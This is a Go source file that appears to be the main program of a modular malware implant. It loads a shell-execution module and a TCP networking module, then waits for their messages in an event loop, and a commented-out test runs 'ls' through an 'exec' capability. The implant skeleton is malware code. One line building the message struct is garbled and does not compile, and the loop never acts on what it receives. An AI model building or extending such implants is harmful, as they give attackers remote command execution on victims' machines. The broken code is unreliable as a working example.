package main

import (
	"fmt"
	"malware/common"
	"malware/common/types"
	"malware/implant/basic_tcp_network"
	"malware/implant/sh"
	"reflect"
)

// List of modules
var modules = map[types.Module]types.Rx_Tx{
	sh.Create():                types.Rx_Tx{},
	basic_tcp_network.Create(): types.Rx_Tx{},
}

func find_capability(capability string) types.Rx_Tx {
	for module, rx_tx := range modules {
		if module.Capability() == capability {
			return rx_tx
		}
	}
	common.Panic("NO capability found", capability)
	return types.Rx_Tx{}
}

func event_loop() {
	for module := range modules {
		defer module.Shutdown()
	}

	cases := make([]reflect.SelectCase, len(modules))
	{
		index := 0
		for _, channel := range modules {
			cases[index] = reflect.SelectCase{Dir: reflect.SelectRecv, Chan: reflect.ValueOf(channel)}
			index++
		}
	}

	for {
		_, value, ok := reflect.Select(cases)
		if !ok {
			// The chosen channel has been closed, channels shouldnt be closing so panic
			common.Panic("Channel closed")
		}

		message := types.Message{Cvalue.Capabilityapability: value.Capability, Caller: }
	}
}

func main() {
	for module, _ := range modules {
		fmt.Println(module.ID(), "starting up...")
		modules[module] = module.Init()

		// //ttest channels
		// fun, ok := capabilities["exec"]
		// if !ok {
		// 	common.Panicf(nil, "Fuck")
		// }

		// channel <- fun([]string{"ls"})
		// <-channel // Wait before closing
		// module.Shutdown()
	}
	event_loop()
}
